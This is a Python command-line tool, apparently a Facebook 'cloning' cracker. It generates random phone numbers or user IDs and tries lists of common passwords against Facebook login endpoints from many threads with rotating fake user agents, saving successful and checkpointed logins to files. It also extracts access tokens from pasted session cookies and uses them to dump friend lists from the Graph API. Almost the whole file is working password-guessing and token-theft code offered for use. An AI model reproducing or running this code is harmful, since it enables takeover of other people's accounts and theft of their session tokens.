#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')  
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os,time,subprocess,requests
P = '\033[1;37m'
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid

try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
user=[]
user=[]
for agent in range(10000):
	zz='Mozilla/5.0 (Linux; U; Android'
	x=random.choice(['6','7','8','9','10','11','12'])
	v=' en-us; GT-'
	n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	m=random.randrange(1, 999)
	l=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	k='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	o=random.randrange(73,100)
	p='0'
	r=random.randrange(4200,4900)
	y=random.randrange(40,150)
	u='Mobile Safari/537.36'
for xd in range(10000):
        a = 'Mozilla/5.0 (Symbian/3; Series60/'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Nokia'
        e = random.randrange(100, 9999)
        f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k = 'Mobile Safari/535.1'
        fullagnt = '{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
for x in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    fullagnt='{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
for agent in range(10000):
    aa='BET_61D_WIFI_11C_HW'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='C67_SmartOpus_SL008_20191225_V802'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Release/2019.12.25 WAP Browser/'
    h=random.randrange(73,100)
    i='MAUI'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='.Profile/ Q03C1-2.40 en-US'
    fullagnt=f'{zz} {x}; {v}{n}{m}{l}) {k}{o}.{p}.{r}.{y} {u}{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    user.append(fullagnt) 

import requests,random,sys,json,os,re
from time import sleep as slp
from os import system as cmd
import os
totaldmp = 0
count = 0
try:
	os.mkdir('Data')
except:
	pass
try:
	os.remove('temp.txt')
except:
	pass
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E',                                                                                                                '4').replace(
    'M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def clear():
	os.system('clear')
	print(logo)
logo =""" 
\033[97;1m   ##     ##    ###    ##    ## #### 
\033[96;1m   ###   ###   ## ##   ###   ##  ##  
\033[93;1m   #### ####  ##   ##  ####  ##  ##  
\033[94;1m   ## ### ## ##     ## ## ## ##  ##  
\033[97;1m   ##     ## ######### ##  ####  ## 
\033[91;1m   ##     ## ##     ## ##   ###  ##  
\033[92;1m   ##     ## ##     ## ##    ## #### 
                                                               
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;33mUSMAN\33[0;m\033[1;32m EX \033[1;33mRONY   \33[0;m
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Usman Rajpoot
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mUSMAN-RAJPOOT
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.2
\033[1;37m══════════════════════════════════════════\n"""
os.system ('clear')

print("\033[1;32m[•] \033[1;33mFOLLOW MY FACEBOOK ID....!")
time.sleep(3)
os.system("xdg-open https://www.facebook.com/usman.rajpoot.1100")
loop = 0
cps = []
oks = []
def Main():
    os.system('clear')
    print(logo)
    print('\n\t\033[1;34m=•=•=•=\33[34;42mMAIN MENU\33[0;m\033[1;34m=•=•=•=\n')
    print('\033[1;93m[1]\033[1;94m  RANDOM CLONING ' )
    print('\033[1;96m[2] \033[1;92m MAKING FILE \033[1;96m••• ULIMATED  ')
    print('\033[1;95m[3]\033[1;95m  SEPARATE NEW LINKS FROM FILE')
    print('\033[1;96m[4]\033[1;94m  REMOVE DOUBLE LINKS FROM FILE')
    print('\033[1;95m[5]\033[1;96m  CREATE A TOKEM FROM A COOKIE')
    print('\033[1;94m[6] \033[1;97m RANDOM UID CLONING \033[1;94m<•> 2009 - 14')
    print('\033[1;92m[7]\033[1;96m  CONTACT ADMIN')
    print('\033[1;95m[8] \033[1;92m REMOVE COOKIE')
    print('\033[1;99m[0] \033[1;97m EXIT TOOL')
    print('\033[1;37m(•)══════════════════════════════════════════')
    opt = input('\n   \x1b[1;32m CHOOSE OPTOIN  =>  ')
    if opt == '1':
    	R()
    if opt == '2':
        file()
    if opt == '3':
        saprate()
    if opt == '4':
    	remove_dub()
    if opt  == '5':
        os.system('clear');print(logo);cookie_make()
    if opt == '6':
        Random() 
    if opt == '7':
        contact() 
    if opt == '8':
        os.system('rm -rf data/cookie.txt')
        os.system('rm -rf data/token.txt')
    if opt == '0':
    	print("\033[1;32m[ √ ] \033[1;37mEXIT SUCCESSFUL \n\033[1;32m[ • ] \033[1;37mOK BYE \n\033[1;32m[ • ] \033[1;37mSEE U AGAIN ");os.system('exit')
    else:
       print('\033[1;37m(•)══════════════════════════════════════════')
       print('\n\x1b[1;31m  Choose valid option\x1b[0;97m')
       time.sleep(3)
       Main()
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		
		print('\033[1;37m(•)══════════════════════════════════════════')
		print(f'\r%s[%s×%s] %sActive Applications Not Found %s        '%(N,H,N,H,N))
		print('\033[1;37m(•)══════════════════════════════════════════')
	else:
		print('\033[1;37m(•)══════════════════════════════════════════')
		print(f'\r{A}[√] %sActive Applications '%(H))
		for i in range(len(game)):
			print(f"\r%s[%s] %s %s"%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s[%s×%s] %sExpired Applications Not Found %s        '%(N,M,N,M,N))
		print('\033[1;37m(•)══════════════════════════════════════════')
	else:
		print('\033[1;37m(•)══════════════════════════════════════════')
		print(f'\r{A}[√] %sExpired Applications '%(M))
		for i in range(len(game)):
			print(f"\r%s[%s] %s %s"%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
			print('\033[1;37m(•)══════════════════════════════════════════')

def R():
	user=[]	
	clear()
	kode = input(f'[~] PAK CODE: 0300,0306,0309,0315,0345 ...\n[~] B D CODE: 880141,880170,880182,880190...\n\033[1;37m[<•>]══════════════════════════════════════════\n[?] PUT CODE: ')
	clear()
	limit = int(input('[!] EXAMPLE : 1000,2000,5000,10000\n[?] LIMINT : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:	
		clear()
		tl = str(len(user))
		print('\033[1;32m(√) Total IDs  :\033[1;32m '+tl)
		print('\033[1;35m(√) Chose Code : \033[1;32m%s'%(kode))
		print("\x1b[38;5;208m(!) Use Flight Mode For Speed UP")
		print('\033[1;37m(<•>)══════════════════════════════════════════')
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khankhan123','khan123','khan12','khan12345','i oove you','bangladesh','khankhan','khan123456','khan1122']
			yaari.submit(mbasic,uid,pwx,tl)
	print('\n\033[1;37m(<•>)══════════════════════════════════════════')
	print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)))
	print('\033[1;37m(<•>)══════════════════════════════════════════')
	print('[•] OK IDS SAVE : /sdcard/MANI-OK.txt\n[•] CP IDS SAVE : /sdcard/MANI-CP.txt')
	input('[•] Press Enter To Back Menu ');Main()
loop = 0
cps = []
oks = []
def mbasic(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			bi = random.choice([A,B,C,D,E,F,G,H])
			session = requests.Session()
			pro = random.choice(user)
			free_fb = session.get(f'https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':"www.facebook.com",
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"', 
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'upgrade-insecure-requests': '1',
			"sec-ch-ua-platform":"'Android'",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			'user-agent':pro}
			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid=coki[141:156]
				print('\r\033[1;32m[USMAN-OK] '+uid+' √ '+ps)
				cek_apk(session,coki)
				open('/sdcard/MANI-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				Red = '\x1b[38;5;208m'
				print(f'\r{Red}[USMAN-CP] '+uid+' ~ '+ps+'\033[1;97m')
				open('/sdcard/MANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(cid)
			else:
				continue
		loop+=1
		sys.stdout.write('\r%s[ M•A•N•I ] %s|OK:-%s'%(bi,loop,len(oks))),
		sys.stdout.flush()
	except:
		pass 
		
mtd = []
def login():
	os.system("clear")
	print(logo)
	try:
		fbcokis= input('\033[1;32m [ ? ] \033[1;36mCOOKIES\033[1;37m  : ')
		print('\n\033[1;37m(•)══════════════════════════════════════════')
		head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
		open("data/token.txt", "w").write(eaag.group(1))
		open("data/cookie.txt", "w").write(fbcokis)
		token = open('data/token.txt','r').read()
		file()
	except Exception as e:
		os.system("rm -rf data/token.txt")
		print("\033[1;32m[*] EXPIRE COOKIES ")
		slp(4)
		login()
def file():
	fbidz = []
	os.system("clear")
	print(logo)
	try:
		fbcokis = open("data/cookie.txt", "r").read()
		token = open('data/token.txt','r').read()
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
	except:
		print(" \033[1;32m[√] LOGIN COOKIES ")
		slp(3)
		login()
	global totaldmp,count
	try:
		token=open('data/token.txt','r').read()
		fbcokis = open("data/cookie.txt", "r").read()
	except FileNotFoundError:
		print('\033[1;37m(•)══════════════════════════════════════════')
		print("[ × ] \033[1;32mEXPIRE COOKIES")
		print('\033[1;37m(•)══════════════════════════════════════════')
		slp(3)
		cmd('rm -rf data/cookie.txt')
		login()
	try:
		cmd('clear')
		os.system("clear")
		print(logo)
		try:
			fbbuid = input(" \033[1;32m[ ~ ] ENTER PUBLIC ID \033[1;37m: ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			for idnm in dmp['friends']['data']:
				totaldmp+=1
				fbidz.append(idnm['id'])
		except KeyError:
			print('\033[1;37m(•)══════════════════════════════════════════')
			print(" \033[1;35m< ! > \033[1;37mNOT PUBLIC ID ")
			print('\033[1;37m(•)══════════════════════════════════════════')
			slp(3)
			file()
			
			print('\033[1;37m(•)══════════════════════════════════════════')
		filepath = input("\n\033[1;36m[~] ENTER FILE SAVE NAME\033[1;37m : ");print('\033[1;37m(•)══════════════════════════════════════════')
		os.system (" clear")
		print(logo);print("YOUR PROCESS HAS BEEN STARTED");print("DONT USE AIRPLANE ✈️ MODE "); print('\033[1;37m(<•>)══════════════════════════════════════════')
	    
		apnd = open(filepath,'w')
		for fbuid in fbidz:
			count += 1
			try:
				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				for idnm in dmp['friends']['data']:
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
				print("\x1b[1;92m[•~•] \033[1;34mMANI \033[1;32m: " + fbuid)
			except KeyError:
				print('\x1b[1;92m[•~•] \033[1;34mMANI \033[1;32m: ' + fbuid)
		apnd.close()
		print('\033[1;37m(•)══════════════════════════════════════════')
		ch_x1 = input("\033[1;32m[ ~ ] \033[1;37mDoYou Want to Use DuplicateID Cuter (n/y) : ")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			print('\033[1;37m(•)══════════════════════════════════════════')
			newfile = input("\033[1;32m[ ~ ] \033[1;37mENTER NEW FILE NAME FOR AS SAVE  : ")
			os.system('sort -r '+filepath+' | uniq > '+newfile)
			print('\033[1;37m(•)══════════════════════════════════════════')
			ch_x2 = input("\033[1;32m[ ~ ] \033[1;37mDoYou Want to Use ID Separator (n/y) : ")
			print('\033[1;37m(•)══════════════════════════════════════════')
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				(newfile)
			else:
				print('\033[1;37m(•)══════════════════════════════════════════')
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
				print('\033[1;37m(•)══════════════════════════════════════════')
				input("\033[1;32m[ • ] \033[1;37mPRESS ENTER TO GO BACK")
				Main()
		else:
			print('\n')
			print('\033[1;37m(•)══════════════════════════════════════════')
			ch_x2 = input("\033[1;32m[ ~ ]\033[1;37m Do You Want to Use ID Separator (n/y) : \033[1;32;1m")
			print('\033[1;37m(•)══════════════════════════════════════════')
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				(filepath)
			else:
				print('\033[1;37m(•)══════════════════════════════════════════')
				print (f"\x1b[0;37m Total ID Dump :\x1b[1;92m {totaldmp}")
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {filepath} ")
				print('\033[1;37m(•)══════════════════════════════════════════')
				input("\033[1;32m[ • ] \033[1;37mPRESS ENTER TO GO BACK ")
				Main()
	except Exception as e:
		print("\033[96;1m[ × ] \033[1;37mERROR \033[92;1m: %s"%e)
		time.sleep(2)
		input("\033[1;32m[ • ] \033[1;37mPRESS ENTER TO GO BACK ")
		Main()
def saprate():
    os.system('clear')
    print(logo)
    print('           \x1b[97m[\033[37;41m  L I N K S   M E N U   \033[0;m] ')
    try:
        limit = int(input(' \033[1;97mHOW MANY LINKS DO YOU WANT TO SPRATE  :- \033[1;92m '))
        print("\n")
        print("\n")
    except:
        limit = 1
    print('           \x1b[97m[\033[37;41m  S A P R A T E   M E N U   \033[0;m] ')
    print("\n")
    print('\033[1;32m PUT YOUR FILE FOR SPRATE')
    file_name = input('\033[1;37m FILE PATH:\033[1;97m ')
    print("\n")
    print(" \033[1;92mPUT YOUR NEW FILE NAME ")
    print('\033[1;33m Example \033[1;92m/sdcard/MANI.txt')
    new_save = input('\033[1;37m NEW FILE PATH: ')
    y = 0
    for k in range(limit):
        y += 1
        print("")
        print("")
        print('\033[1;32m EXAMPLE [100080],[100081] [100083] ETC  \033[0m')
        print("")
        links = input(' \033[1;37mPUT LINKS  %s:\033[1;32m ' % (y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print('\033[1;37m(•)══════════════════════════════════════════')
    print("\n")
    print('\033[1;37m LINKS GRABBED SUCCESSFULLY')
    print('\033[1;97m TOTAL GRABBED LINKS:\033[1;32m   ' +
          str(len(open(new_save).read().splitlines())))
    print('\033[1;37m NEW FILE SAVE AS: \033[1;32m  '+new_save)
    print('\033[1;37m(•)══════════════════════════════════════════')
    print("")
    input('\033[1;32m PRESS ENTER TO BACK ')
    Main()

def remove_dub():
    os.system('clear')
    print(logo)
    print('           \x1b[97m[\033[37;41m  DUBBLE LINKS CUTTER MENU   \033[0;m] ')
    print("\033[1;92m[+] \033[1;97mEXAMPLE : \033[1;92m/sdcard/your_file_name.txt  \n\n")
    print("")
    Error = input('\033[1;92m[+]\033[1;97m FILE PATH   :\033[1;92m ')
    print("")
    Error1 = input('\033[1;92m[+] \033[1;97mNEW FILE SAVE AS :\033[1;92m ')
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print("")
    print("")
    print('\033[1;37m(•)══════════════════════════════════════════')
    print("")
    print("\033[1;92m[+] \033[1;97mREMOVING DUBBLE LINKS SUCCESSFULLY " + Error)
    print("\033[1;92m[+]\033[1;97m NEW FILE SAVE AS : \033[1;92m" + Error1)
    print('\033[1;37m(•)══════════════════════════════════════════')
    print("")
    input('\033[1;32m PRESS ENTER TO BACK ');Main()

class Random:
    def __init__(self):
        self.id = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\t    \033[0;92m 2006-14 UID CLONING \033[0;97m ")
        print('\033[1;37m(•)══════════════════════════════════════════')
        print(" \033[1;97m[1] \033[1;93mCRACK RANDOM FB ID 2004-09 ")
        print(" \033[1;97m[B] \033[1;92mBack in menu")
        print('\033[1;37m(•)══════════════════════════════════════════')
        annu = input("\033[0;97m[+] \033[0;92mCHOOSE \033[0;91m: \033[0;96m")
        if annu in ["", " "]:
            Random()
        elif annu in ["1", "01"]:
            os.system("clear");print(logo);self.fbtua()
        elif annu in ["B", "b"]:
        	Main() 
    def fbtua(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        
        limit = int(input("\033[0;97m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000) \033[0;91m: \033[0;96m"))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;97m[√] \033[0;92mTOTAL IDS \033[0;91m: \033[0;97m%s\033[0;96m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("%s\033[0;92m[+] \033[0;97mENTER PASSWORD EXAMPLE \033[0;91m: \033[0;92m%s(123456)" % (Y, G))
                print('\033[1;37m(•)══════════════════════════════════════════')
                listpass = input("%s\033[0;92m[?] \033[0;97mENTER PASSWORD \033[0;91m: \033[0;92m%s " % (Y, G))
                if len(listpass) <= 5:
                    exit("%s\033[0;92m[!] \033[0;92mPASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s\033[0;92m[*] \033[0;97mCRACK WITH PASSWORD \033[0;91m-> \033[0;93m[\033[0;92m%s\033[0;93m]" % (Y, listpass))
                os.system("clear");print(logo)
                print("%s\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> MANI-OK.txt" % (G))
                print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> MANI-CP.txt" % (Y))
                print('\033[1;37m(•)══════════════════════════════════════════')
                print("\x1b[38;5;208m(!) Use Flight Mode For Speed UP")
                print('\033[1;37m(•)══════════════════════════════════════════')
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            input("\033[0;92m[√]\033[0;97m CRACK COMPLETE...\n\033[0;92m[~] \033[0;97mPRESS ENTER TO BACK MAIN MENU");Main()
        except Exception as e:
            exit(str(e))
    def api(self, uid, pwx):
        ua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
])
        sys.stdout.write("\r\r %s\033[0;97m[\033[0;92m M•A•N•I \033[0;97m]\033[0;97m  %s\033[0;97m/\033[0;92m%s \033[0;97m[\033[0;92mOK\033[0;91m:\033[0;92m%s\033[0;97m]" % (B, self.loop, len(self.id), len(self.cp)));sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"}
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[USMAN-OK] %s √ %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s√%s" % (uid, pw))
                open("MANI-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
                break
            else:
                continue
        self.loop += 1
def contact():
	os.system ('clear')
	print (logo)
	print(" \033[1;37m[1] \033[1;32mWHATSAPP ")
	print(" \033[1;37m[2] \033[1;33mFACEBOOK")
	print(" \033[1;37m[3] \033[1;34mINSTAGRAME")
	print("\033[1;37m [0] \033[1;35mBACK ")
	print('\033[1;37m(•)══════════════════════════════════════════')
	ok = input('\033[1;32mCHOOSE : \033[1;37m')
	if ok =='1':
		os.system("xdg-open https://wa.me/+923187061605");contact()
	if ok =='2':
		os.system("xdg-open https://www.facebook.com/usman.rajpoot.1100");contact()
	if ok =='3':
		print("\033[0;97m USER NAME :\033[0;92m  rajpoot._.080 ")
		input(" PRESS ENTER TO BACK ");Main()
	if ok =='0':
		Main()
def cookie_make():
    print('\t\033[1;34m=•=•=•=\33[34;42mPUT COOKIE GET FRESH TOKEN\33[0;m\033[1;34m=•=•=•=')
    cookie = input('\033[92;1mCOOKIE\033[97;1m : ')
    try:
        data = requests.get('https://business.facebook.com/business_locations', headers = {
            'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
            'referer'                   : 'https://www.facebook.com/',
            'host'                      : 'business.facebook.com',
            'origin'                    : 'https://business.facebook.com',
            'upgrade-insecure-requests' : '1',
            'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control'             : 'max-age=0',
            'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type'              : 'text/html; charset=utf-8'
        }, cookies = {
            'cookie'                    : cookie
        })
        find_token = re.search('(EAAG\w+)', data.text)
        
        results    = '\n \033[92;1m[ ! ] \033[97;1mEXPIRE COOKIE...! ' if (find_token is None) else '\n \033[1;37m(•)══════════════════════════════════════════\n\033[95;1m[ √ ] \033[98;1mYOUR TOKEN\033[92;1m :  ' + find_token.group(1)

    except requests.exceptions.ConnectionError:
	
        results    = ' \033[92;1m[ × ] \033[97;1mNETWORK PROBLEM'
        print('\033[1;37m(•)══════════════════════════════════════════')
    except:
        results    = '\n\033[92;1m [ × ]\033[97;1m UNKNOWN PROBLEM '
    print('\033[1;37m(•)══════════════════════════════════════════')
    print(results)
    print('\033[1;37m(•)══════════════════════════════════════════')
    input('\033[1;32m PRESS ENTER TO BACK ');Main()
    
Main() 